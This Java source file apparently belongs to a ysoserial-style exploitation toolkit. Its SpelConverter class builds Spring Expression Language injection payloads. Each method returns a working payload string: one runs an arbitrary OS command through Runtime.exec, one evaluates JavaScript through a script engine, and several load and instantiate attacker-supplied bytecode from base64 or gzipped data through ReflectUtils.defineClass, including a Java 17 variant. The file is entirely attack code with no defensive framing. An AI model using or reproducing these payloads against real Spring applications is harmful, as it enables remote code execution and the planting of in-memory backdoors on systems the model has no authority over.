package com.h2tg.ysogate.bullet.defineClass;

public class SpelConverter
{
    public static String spel2js(String js)
    {
        String code = "''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\""+js+"\")";
        return code;
    }
    public static String spel2cmd(String cmd)
    {
        String code = "''.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\""+cmd+"\")";
        return code;
    }
    public static String spel2defineClass(String baseCode,String classname)
    {
        String code="T(org.springframework.cglib.core.ReflectUtils).defineClass('"+classname+"',T(org.springframework.util.Base64Utils).decodeFromString('"+baseCode+"'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()";
        return code;
    }
    public static String spel2defineClassGzip(String gzipBaseCode,String classname)
    {
        String code = "T(org.springframework.cglib.core.ReflectUtils).defineClass('"+classname+"',T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('"+gzipBaseCode+"')))),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()";
        return code;
    }
    public static String spel2defineClass17(String baseCode,String classnameInSpringPackage)
    {
        String code = "T(org.springframework.cglib.core.ReflectUtils).defineClass('"+classnameInSpringPackage+"',T(java.util.Base64).getDecoder().decode('"+baseCode+"'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(\"org.springframework.expression.ExpressionParser\"))";
        return code;
    }
}
